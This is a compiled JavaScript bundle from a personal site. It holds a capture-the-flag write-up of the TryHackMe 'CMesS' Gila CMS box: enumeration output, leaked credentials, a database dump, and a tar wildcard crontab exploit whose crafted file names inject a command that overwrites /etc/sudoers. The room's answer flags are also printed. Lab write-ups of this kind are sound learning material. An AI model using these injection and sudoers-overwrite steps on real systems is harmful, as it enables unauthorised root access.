"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3674],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},s=Object.keys(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),c=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},u=function(e){var t=c(e.components);return r.createElement(l.Provider,{value:t},e.children)},p="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,s=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),p=c(n),d=a,h=p["".concat(l,".").concat(d)]||p[d]||m[d]||s;return n?r.createElement(h,o(o({ref:t},u),{},{components:n})):r.createElement(h,o({ref:t},u))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var s=n.length,o=new Array(s);o[0]=d;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[p]="string"==typeof e?e:a,o[1]=i;for(var c=2;c<s;c++)o[c]=n[c];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},36205:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>m,frontMatter:()=>s,metadata:()=>i,toc:()=>c});var r=n(87462),a=(n(67294),n(3905));const s={},o="CMesS",i={unversionedId:"Tryhackme/CMesS/CMess",id:"Tryhackme/CMesS/CMess",title:"CMesS",description:"Can you root this Gila CMS box?",source:"@site/writeups/Tryhackme/CMesS/CMess.md",sourceDirName:"Tryhackme/CMesS",slug:"/Tryhackme/CMesS/",permalink:"/writeups/Tryhackme/CMesS/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"CC: Steganography",permalink:"/writeups/Tryhackme/CC Steganography/"},next:{title:"CTF collection Vol.1",permalink:"/writeups/Tryhackme/CTF collection Vol.1/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Flags",id:"task-1-flags",level:2}],u={toc:c},p="wrapper";function m(e){let{components:t,...n}=e;return(0,a.kt)(p,(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"cmess"},"CMesS"),(0,a.kt)("p",null,"Can you root this Gila CMS box?"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/cmess"},"CMesS")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"DNS Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,a.kt)("li",{parentName:"ul"},"SQL Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Backup Poking"),(0,a.kt)("li",{parentName:"ul"},"Exploiting Crontab")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-flags"},"Task 1 Flags"),(0,a.kt)("p",null,"Please add MACHINE_IP cmess.thm to /etc/hosts\nPlease also note that this box does not require brute forcing!"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/CMesS$ sudo nmap -sS -sC -sV -O 10.10.170.206\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 20:16 CEST\nNmap scan report for 10.10.170.206\nHost is up (0.033s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)\n|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)\n|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: Gila CMS\n| http-robots.txt: 3 disallowed entries\n|_/src/ /themes/ /lib/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/11%OT=22%CT=1%CU=39063%PV=Y%DS=2%DC=I%G=Y%TM=5F834C\nOS:0A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST\nOS:11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.59 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/CMesS$ searchsploit Gila CMS\n---------------------------------------------------------------- ---------------------------------\n Exploit Title                                                  |  Path\n---------------------------------------------------------------- ---------------------------------\nGila CMS 1.11.8 - 'query' SQL Injection                         | php/webapps/48590.py\nGila CMS 1.9.1 - Cross-Site Scripting                           | php/webapps/46557.txt\nGila CMS < 1.11.1 - Local File Inclusion                        | multiple/webapps/47407.txt\n---------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/CMesS$ gobuster dir -u 10.10.170.206 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.170.206\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/11 20:18:55 Starting gobuster\n===============================================================\n/index (Status: 200)\n/about (Status: 200)\n/search (Status: 200)\n/blog (Status: 200)\n/login (Status: 200)\n/01 (Status: 200)\n/1 (Status: 200)\n/category (Status: 200)\n/themes (Status: 301)\n/feed (Status: 200)\n/0 (Status: 200)\n/admin (Status: 200)\n/assets (Status: 301)\n/tag (Status: 200)\n/author (Status: 200)\n/Search (Status: 200)\n/sites (Status: 301)\n/About (Status: 200)\n/log (Status: 301)\n/Index (Status: 200)\n/tags (Status: 200)\n/1x1 (Status: 200)\n/lib (Status: 301)\n/src (Status: 301)\n/api (Status: 200)\n/001 (Status: 200)\n/1pix (Status: 200)\n/fm (Status: 200)\n/tmp (Status: 301)\n/1a (Status: 200)\n/0001 (Status: 200)\n/1x1transparent (Status: 200)\n/INDEX (Status: 200)\n/1px (Status: 200)\n/1d (Status: 200)\n/1_1 (Status: 200)\n/Author (Status: 200)\n/1pixel (Status: 200)\n/0001-exploits (Status: 200)\n/01_hello (Status: 200)\n/1-1 (Status: 200)\nProgress: 11952 / 220561 (5.42%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/11 20:28:45 Finished\n===============================================================\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/CMesS$ wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107\n\nWarning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\'s documentation for more information.\n\n********************************************************\n* Wfuzz 2.4.5 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://cmess.thm/\nTotal requests: 4997\n\n===================================================================\nID           Response   Lines    Word     Chars       Payload\n===================================================================\n\n000000019:   200        30 L     104 W    934 Ch      "dev"\n')),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://dev.cmess.thm/"},"Development Log")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Development Log\nandre@cmess.thm\n\nHave you guys fixed the bug that was found on live?\nsupport@cmess.thm\n\nHey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!\nsupport@cmess.thm\n\nUpdate! We have had to delay the patch due to unforeseen circumstances\nandre@cmess.thm\n\nThat's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.\nsupport@cmess.thm\n\nYour password has been reset. Here: KPFTN_f2yxe%\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"andre@cmess.thm:KPFTN_f2yxe%")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n\n$GLOBALS['config'] = array (\n  'db' =>\n  array (\n    'host' => 'localhost',\n    'user' => 'root',\n    'pass' => 'r0otus3rpassw0rd',\n    'name' => 'gila',\n  ),\n  'permissions' =>\n  array (\n    1 =>\n    array (\n      0 => 'admin',\n      1 => 'admin_user',\n      2 => 'admin_userrole',\n    ),\n  ),\n  'packages' =>\n  array (\n    0 => 'blog',\n  ),\n  'base' => 'http://cmess.thm/gila/',\n  'theme' => 'gila-blog',\n  'title' => 'Gila CMS',\n  'slogan' => 'An awesome website!',\n  'default-controller' => 'blog',\n  'timezone' => 'America/Mexico_City',\n  'ssl' => '',\n  'env' => 'pro',\n  'check4updates' => 1,\n  'language' => 'en',\n  'admin_email' => 'andre@cmess.thm',\n  'rewrite' => true,\n);\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"www-data@cmess:/var/www$ mysql -u root -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 43362\nServer version: 5.7.29-0ubuntu0.16.04.1 (Ubuntu)\n\nCopyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| gila               |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n5 rows in set (0.00 sec)\n\nmysql> use gila;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql> show tables;\n+----------------+\n| Tables_in_gila |\n+----------------+\n| option         |\n| page           |\n| post           |\n| postcategory   |\n| postmeta       |\n| user           |\n| usermeta       |\n| userrole       |\n| widget         |\n+----------------+\n9 rows in set (0.00 sec)\n\nmysql> SELECT * FROM user;\n+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+\n| id | username | email           | pass                                                         | active | reset_code | created             | updated             |\n+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+\n|  1 | andre    | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa |      1 |            | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 |\n+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+\n1 row in set (0.00 sec)\n\nmysql>\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'www-data@cmess:/var/www$ cat /opt/.password.bak\nandres backup password\nUQfsdCB7aAP6\nwww-data@cmess:/var/www$ su -l andre\nPassword:\nandre@cmess:~$ cd\nandre@cmess:~$ ls\nbackup  user.txt\nandre@cmess:~$ cat user.txt\nthm{c529b5d5d6ab6b430b7eb1903b2b5e1b}\nandre@cmess:~/backup$ echo \'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers\' > privesc.sh\nandre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh privesc.sh"\nandre@cmess:~/backup$ echo "" > --checkpoint=1\nandre@cmess:~/backup$ sudo su\nroot@cmess:/home/andre/backup# cd /root/\nroot@cmess:~# ls -la\ntotal 28\ndrwx------  2 root  root  4096 Feb 13  2020 .\ndrwxr-xr-x 22 root  root  4096 Feb  6  2020 ..\nlrwxrwxrwx  1 root  root     9 Feb  6  2020 .bash_history -> /dev/null\n-rw-r--r--  1 root  root  3106 Oct 22  2015 .bashrc\n-rw-------  1 root  root   169 Feb  6  2020 .mysql_history\n-rw-r--r--  1 root  root   148 Aug 17  2015 .profile\n-rw-r--r--  1 andre andre   38 Feb  6  2020 root.txt\n-rw-rw-rw-  1 root  root  4057 Feb 13  2020 .viminfo\nroot@cmess:~# cat root.txt\nthm{9f85b7fdeb2cf96985bf5761a93546a2}\nroot@cmess:~#\n')),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Compromise this machine and obtain user.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Escalate your privileges and obtain root.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{9f85b7fdeb2cf96985bf5761a93546a2}")))}m.isMDXComponent=!0}}]);